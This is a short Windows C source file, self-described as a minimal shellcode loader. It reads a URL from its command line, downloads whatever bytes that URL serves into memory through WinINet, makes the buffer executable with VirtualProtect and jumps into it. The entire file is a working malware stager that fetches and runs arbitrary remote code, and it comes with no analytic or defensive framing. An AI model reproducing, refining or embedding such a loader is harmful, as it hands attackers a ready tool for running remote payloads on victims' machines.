#include <windows.h>
#include <wininet.h>

// Ultra-minimal shellcode loader - optimized for size
void WinMainCRTStartup(void) {
    LPWSTR cmdLine = GetCommandLineW();
    
    // Skip to URL parameter
    LPWSTR url = cmdLine;
    if (*url == L'"') { url++; while (*url && *url != L'"') url++; if (*url) url++; }
    else { while (*url && *url != L' ') url++; }
    while (*url == L' ') url++;
    
    if (!*url) ExitProcess(1);
    
    // Initialize internet connection
    HINTERNET hNet = InternetOpenW(L"SL", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
    if (!hNet) ExitProcess(2);
    
    HINTERNET hUrl = InternetOpenUrlW(hNet, url, 0, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) { InternetCloseHandle(hNet); ExitProcess(3); }
    
    // Allocate buffer
    DWORD size = 8192, total = 0, read;
    LPVOID buf = VirtualAlloc(0, size, MEM_COMMIT, PAGE_READWRITE);
    if (!buf) { InternetCloseHandle(hUrl); InternetCloseHandle(hNet); ExitProcess(4); }
    
    // Download
    while (InternetReadFile(hUrl, (LPBYTE)buf + total, 1024, &read) && read) {
        total += read;
        if (total + 1024 > size) {
            size *= 2;
            LPVOID newBuf = VirtualAlloc(0, size, MEM_COMMIT, PAGE_READWRITE);
            if (!newBuf) break;
            CopyMemory(newBuf, buf, total);
            VirtualFree(buf, 0, MEM_RELEASE);
            buf = newBuf;
        }
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hNet);
    
    if (total) {
        DWORD oldProt;
        VirtualProtect(buf, total, PAGE_EXECUTE_READ, &oldProt);
        ((void(*)())buf)();
    }
    
    VirtualFree(buf, 0, MEM_RELEASE);
    ExitProcess(0);
}